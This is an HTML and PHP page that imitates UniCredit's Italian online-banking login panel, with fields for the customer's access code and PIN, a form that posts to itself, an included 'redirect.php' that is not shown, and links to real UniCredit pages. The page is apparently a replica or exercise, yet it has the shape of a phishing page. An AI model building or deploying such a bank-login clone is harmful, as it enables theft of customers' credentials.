<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Banca</title>
  <link rel="stylesheet" href="CSS/style.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>
<body>
  <input type="button" value="Login" id="open" onclick="openPanel()">
  <div id="pannello">
    <div id="titolo">
      <button type="button" class="close" onclick="closePanel()"><i id='close' class="fa fa-times fa-2x" style="color:#26262d"></i></button>
      <h1>Area riservata</h1>
    </div>
    <p class="links">
      <a href="https://www.unicredit.it/it/info/sicurezza.html">Scopri come proteggerti da false telefonate, e-mail ed SMS inviati a nome UniCredit.<br> Scopri tutto quello che c'è da sapere per accedere.</a>
    </p>

    <div id="errore">

    </div>
    
    <form class="form1" method="POST" action="#">
      <label for="codice">Inserisci codice adesione 
        <div class="tooltip">
          <button type="button" class="info" onmouseover="ShowInfo1()">  
            <i id="icon1" class="fa fa-info"></i>  
          </button>
          <span class="tooltiptext" id="text1">- Errore nella generazione del testo -</span>
        </div>
      </label>
      <br>
      <input type="text" id="codice" name="codice" placeholder="Inserisci Codice" maxlength="8">
      <br><br>
      <label for="pin">Inserisci il PIN 
        <div class="tooltip">
          <button type="button" class="info" onmouseover="ShowInfo2()">  
            <i id="icon2" class="fa fa-info"></i>  
          </button>
          <span class="tooltiptext" id="text2">- Errore nella generazione del testo -</span>
        </div>
      </label>
      <br>
      <div class="input-wrapper"> 
        <input id="pin" name="pin" type="password" placeholder="Inserisci PIN" maxlength="8"> 
        <button type="button" class="toggle-password" onclick="togglePasswordVisibility()"> 
          <i id="toggleIcon" class="fa fa-eye"></i> 
        </button> 
      </div>
      <br>
      <label for="toggle" style="font-size: 18px;">Modalità "Oscura dati"</label>
      <label class="switch" for="toggle"> 
        <input type="checkbox" id="toggle" name="toggle"> 
        <span class="slider round"></span>
      </label>
      <br>
      <input class="submit" type="submit" name="accedi" value="Accedi all'area riservata">
      <?php
      
      include "redirect.php";
      ?>
    </form>
    <div class="links">
      <p>
        <a href="https://www.unicredit.it/it/privati/internet-e-mobile/tutti-i-servizi-internet-e-mobile/internet-e-mobile-banking/banca-via-internet.html#">RECUPERA CODICE ADESIONE <span style="font-weight: bolder;">></span></a>
        <a href="https://www.unicredit.it/it/privati/internet-e-mobile/tutti-i-servizi-internet-e-mobile/internet-e-mobile-banking/banca-via-internet.html#">RICHIEDI PIN<span style="font-weight: bolder;">></span></a>
        <a href="https://www.unicredit.it/it/privati/internet-e-mobile/tutti-i-servizi-internet-e-mobile/internet-e-mobile-banking/banca-via-internet.html#">RIATTIVA IL SERVIZIO <span style="font-weight: bolder;">></span></a>
      </p>
      <br>
      <p>
        <a href="https://corporateportal.unicreditgroup.eu/portal/italy/login">UNIWEB <span style="font-weight: 1000;">></span></a>
        <a href="https://www.unicredit.it/it/privati/internet-e-mobile/tutti-i-servizi-internet-e-mobile/internet-e-mobile-banking/banca-via-internet.html#">ADESIONE UNICREDIT DIGITAL MAIL BOX <span style="font-weight: bolder;">></span></a>
        <a href="https://www.unicredit.it/it/privati/internet-e-mobile/tutti-i-servizi-internet-e-mobile/internet-e-mobile-banking/banca-via-internet.html#">ALTRI ACCESSI<span style="font-weight: bolder;">></span></a>
      </p>
    </div>
    <br>
    <hr class="linea_divisoria">
    <br>
    <div class="links">
      <p>
        <a href="servizioClienti.html">SERVIZIO CLIENTI <span style="font-weight: bolder;">></span></a>
        <a href="sicurezzaRequisiti.html">SICUREZZA E REQUISITI<span style="font-weight: bolder;">></span></a>
      </p>
    </div>  
  </div>
  
  <script type="text/javascript" src="Js/script.js"></script>
</body>


</html>
